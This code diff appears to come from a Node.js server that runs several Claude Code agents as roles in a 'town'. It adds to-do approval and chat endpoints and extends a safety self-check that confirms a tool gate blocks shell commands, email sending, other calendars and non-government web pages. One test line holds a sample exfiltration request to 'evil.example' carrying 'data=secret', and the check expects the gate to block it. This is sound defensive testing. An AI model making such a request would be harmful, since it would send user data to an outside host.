+  if (req.method === 'POST' && url.pathname === '/huddle') {
+    if (huddleRunning) return send(429, { error: 'The huddle is already running.' });
+    runHuddle().catch(() => {});
+    return send(200, { started: true });
+  }
+  if (req.method === 'GET' && url.pathname === '/questions') return send(200, { questions: loadQuestions().slice(-100) });
+  if (req.method === 'POST' && url.pathname === '/questions') {
+    const j = await readBody(req, 4000);
+    try { return send(200, { question: answerQuestion(Number(j.id), j.answer, !!j.skip) }); } catch (e) { return send(400, { error: e.message }); }
+  }
+  if (req.method === 'POST' && url.pathname === '/hallway') {
+    const j = await readBody(req, 1000);
+    const a = String(j.a || ''), b = String(j.b || '');
+    if (busyAgents.has('hallway')) return send(200, { real: false, why: 'Another hallway conversation is happening.' });
+    busyAgents.add('hallway');
+    try { return send(200, await hallway(a, b)); } catch (e) { return send(200, { real: false, why: e.message }); } finally { busyAgents.delete('hallway'); }
+  }
+  // proposed to-dos: Approve (Marshall hands it out) or Decline
+  if (req.method === 'POST' && url.pathname === '/todos/decide') {
+    const j = await readBody(req, 1000);
+    const todos = loadTodos(), t = todos.find(x => x.id === Number(j.id));
+    if (!t || t.status !== 'proposed') return send(400, { error: 'That proposal is no longer waiting.' });
+    if (j.approve) {
+      t.status = 'choosing'; t.approved = new Date().toISOString(); saveTodos(todos);
+      addLog('Sheriff', 'Marshall', `Approved ${t.proposedBy}'s proposal: ${t.text}`, 'todo');
+      handleTodo(t.id).catch(e => { const all = loadTodos(), x = all.find(y => y.id === t.id); if (x) { x.status = 'problem'; x.note = e.message; saveTodos(all); } });
+    } else { t.status = 'declined'; saveTodos(todos); addLog('Sheriff', t.proposedBy, `Declined: ${t.text}`, 'system'); }
+    noticeOpenItems();
+    return send(200, { todo: t });
+  }
   // who lives in town (workers come and go as the Sheriff hires them), and who's waiting at the town hall
   if (req.method === 'GET' && url.pathname === '/roster') {
     return send(200, { workers: workers().map(w => ({ key: w.key, name: w.name, owner: w.owner })), candidate: loadHiring().candidate });
@@ -1211,7 +1474,7 @@ function probe(agent, tools) {
   return new Promise((resolve) => {
     const args = ['-p', 'safety check', '--model', MODEL, '--output-format', 'stream-json', '--verbose', '--max-turns', '1',
       ...lockdown(agent, tools), '--permission-mode', 'dontAsk'];
-    const env = { ...subscriptionEnv(!!tools), ANTHROPIC_BASE_URL: 'http://127.0.0.1:9' };
+    const env = { ...subscriptionEnv(usesConnectors(tools)), ANTHROPIC_BASE_URL: 'http://127.0.0.1:9' };
     let out = '', done = false, child;
     try { child = spawn(CLAUDE, args, { cwd: ROOM, env, shell: false, windowsHide: true }); } catch (e) { return resolve({ error: String(e.message || e) }); }
     const finish = (r) => { if (done) return; done = true; try { child.kill('SIGKILL'); } catch { /* */ } resolve(r); };
@@ -1240,6 +1503,12 @@ async function checkSafety() {
     say(plain.tools.length === 0, `tools they can use: ${plain.tools.length ? plain.tools.join(', ') : 'none'}`);
     say(plain.mcp.length === 0, `connections (connectors/MCP): ${plain.mcp.length ? plain.mcp.join(', ') : 'none'}`);
   }
+  for (const [who, label] of [['clem', 'Prospecting (web search and pages)'], ['beatrice', 'Legal (web search, .gov pages)'], ['augustus', 'Sales (calendar, read-only)']]) {
+    const r = await probe(who, toolsFor(who));
+    console.log(`\n${label}:`);
+    if (r.error) say(false, `couldn't check: ${r.error}`);
+    else say(r.tools.filter(t => !t.startsWith('mcp__')).every(t => BUILT_IN.has(t)), `built-in tools: ${r.tools.filter(t => !t.startsWith('mcp__')).join(', ') || 'none'}`);
+  }
   const gmail = await probe('rufus', [DRAFT_TOOL]);
   console.log('\nRufus saving a Gmail draft (only after you press the button):');
   if (gmail.error) say(false, `couldn't check: ${gmail.error}`);
@@ -1249,14 +1518,23 @@ async function checkSafety() {
     console.log(`       allowed: ${DRAFT_TOOL} only; every other tool is blocked by the tool gate`);
   }
   // the gate itself: allows only what it's told to
-  const gateSays = (tool, allowed) => new Promise((resolve) => {
-    const c = spawn(process.execPath, [GATE, 'safety-check', path.join(HOME, 'gate-selftest.jsonl'), ...allowed], { stdio: ['pipe', 'ignore', 'ignore'] });
-    c.on('close', (code) => resolve(code)); c.stdin.end(JSON.stringify({ tool_name: tool }));
+  const gateSays = (tool, allowed, input) => new Promise((resolve) => {
+    const c = spawn(process.execPath, [GATE, 'safety-check', path.join(HOME, 'gate-selftest.jsonl'), JSON.stringify(asPolicy(allowed))], { stdio: ['pipe', 'ignore', 'ignore'] });
+    c.on('close', (code) => resolve(code)); c.stdin.end(JSON.stringify({ tool_name: tool, tool_input: input || {} }));
   });
   console.log('\nThe tool gate:');
   say(await gateSays('Bash', []) === 2, 'blocks commands (Bash)');
   say(await gateSays(`mcp__${GMAIL_SERVER}__send_message`, [DRAFT_TOOL]) === 2, 'blocks sending email, even on a Gmail draft run');
   say(await gateSays(DRAFT_TOOL, [DRAFT_TOOL]) === 0, 'lets Rufus create a draft, only when allowed');
+  say(await gateSays('WebFetch', toolsFor('beatrice'), { url: 'https://evil.example/?data=secret' }) === 2, 'Legal can\'t open non-government pages');
+  say(await gateSays('WebFetch', toolsFor('beatrice'), { url: 'https://www.irs.gov/businesses' }) === 0, 'Legal can open official .gov pages');
+  say(await gateSays('WebFetch', toolsFor('ezra'), { url: 'https://example.com' }) === 2, 'Product (who reads the library) can\'t open web pages');
+  say(await gateSays(CAL('list_events'), toolsFor('augustus'), { calendarId: 'family@example.com' }) === 2, 'calendar readers can\'t read other calendars');
+  say(await gateSays(CAL('list_events'), toolsFor('augustus'), {}) === 0, 'calendar readers can read the primary calendar');
+  say(await gateSays(CAL('create_event'), toolsFor('augustus'), {}) === 2, 'nobody can create calendar events (yet)');
+  say(await gateSays('WebSearch', toolsFor('mortimer'), {}) === 2, 'Finance has no tools yet');
+  for (const w of workers()) if (Object.keys(toolsFor(w.key)).length) say(false, `worker ${w.name} has tools`);
+  say(true, 'workers have no tools');
   try { fs.unlinkSync(path.join(HOME, 'gate-selftest.jsonl')); } catch { /* */ }
   console.log('\nOther checks:');
   say(!Object.keys(subscriptionEnv(false)).some(k => /^ANTHROPIC_|^CLAUDE_CODE_USE_/.test(k)), 'no API key or other billing route reaches Claude Code');
